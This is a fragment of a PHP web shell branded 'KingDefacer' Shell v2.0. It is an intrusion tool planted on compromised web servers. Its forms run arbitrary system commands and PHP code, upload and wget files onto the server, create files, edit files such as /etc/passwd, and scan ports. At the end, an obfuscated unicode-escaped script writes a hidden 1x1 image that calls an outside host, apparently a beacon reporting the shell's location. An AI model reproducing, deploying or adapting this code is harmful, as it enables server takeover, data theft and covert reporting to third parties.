    <tr><td><form action='$self' method='post'>Host: Start port: <input type='text' value='localhost' name='host'></br>Start port: <input type='text' value='80' style='width: 50px' name='sport'> End Port: <input type'text' style='width: 50px' value='1000' name='eport'></br><input type='submit' value='Scan' name='port_scan'>Using: <select name='type'><option value='php'>PHP</option><option value='perl'>Perl</option></select></form></td><td>Finish this next</td></tr>
    </table>";
}
function TrueSize($s)
{
    if(!$s) return 0;
    if($s>=1073741824) return(round($s/1073741824)." GB");
    elseif($s>=1048576) return(round($s/1048576)." MB");
    elseif($s>=1024) return(round($s/1024)." KB");
    else return($s." B");
}
function CleanDir($d)
{
    $d=str_replace("\\","/",$d);
    $d=str_replace("//","/",$d);
    return $d;
}
function Trail($d)
{
    $d=explode('/',$d);
    array_pop($d);
    array_pop($d);
    $str=implode($d,'/');
    return $str;
}
function Encoder()
{
    echo "<form action='$self?' method='post'>
    <center>
    Input: <input type='text' style='width: 300px' name='encrypt'>
    <br><input type='submit' value='Encrypt' name='encryption'>
    </center>
    </form>";
}
$relpath=(isset($_GET['d']))?CleanDir($_GET['d']):CleanDir(realpath(getcwd()));
if(isset($_GET['d'])) $self.="?d=$_GET[d]";
echo "<table style='text-align: center; width: 100%'>
<tr><td colspan='2'>Execute command</td></tr>
<tr><td colspan='2'><form action='$self?' method='post'><input type='text' style='width: 600px' value='whoami' name='cmd'><input type='submit' name='execmd' value='Execute'></form></td></tr>
<tr><td colspan='2'>Execute PHP</td></tr>
<tr><td colspan='2'><form action='$self' method='post'><textarea rows='2' cols='80' name='phpcode' style='background-color: black;'>//Don't include PHP tags</textarea><input type='submit' name='execphp' value='Execute'></form></td></tr>
<tr><td>Create directory</td><td>Create file</td></tr>
<tr><td><form action='$self' method='post'><input type='text' style='width: 250px' value='$relpath/sikreet/' name='newdir'><input type='submit' value='Create' name='cnewdir'></form></td><td><form action='$self' method='post'><input type='text' style='width: 250px' value='$relpath/index2.php' name='newfile'><input type='submit' value='Create' name='cnewfile'></form></td></tr>
<tr><td>Enter directory</td><td>Edit file</td></tr>
<tr><td><form action='$self' method='post'><input type='text' style='width: 225px' name='godir'><input type='submit' value='Go' name='enterdir'></form></td><td><form action='$self' method='post'><input type='text' style='width: 255px' value='/etc/passwd' name='editfile'><input type='submit' name='doeditfile' value='Go'></form></td></tr>
<tr><td>Upload file</td><td>Wget file</td></tr>
<tr><td><form action='$self' method='post' enctype='multipart/form-data'>Save location: <input type='text' style='width: 300px' value='$relpath' name='u_location'></br><input type='file' name='u_file'><input type='submit' value='Upload' name='doUpload'></form></td><td><form action='$self' method='post'><input type='text' style='width: 255px' value='http://www.site.com/image1.jpg' name='wgetfile'><input type='submit' name='dogetfile' value='Go'></form</td></tr>
<tr><td colspan='2'>Switch theme: <a href='$self?theme=green'>Matrix Green</a>, <a href='$self?theme=uplink'>Uplink Blue</a>, <a href='$self?theme=dark'>Dark</a></td></tr>
</table>
</br></br><div id='bar'><center>Shell [version 2.0] Edited By <font color='red'><b>[KingDefacer]</font> | Page generated in : <font color='red'>".round(microtime()-$start,2)." seconds</font></center></div></body></html>";
ob_end_flush();
?>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>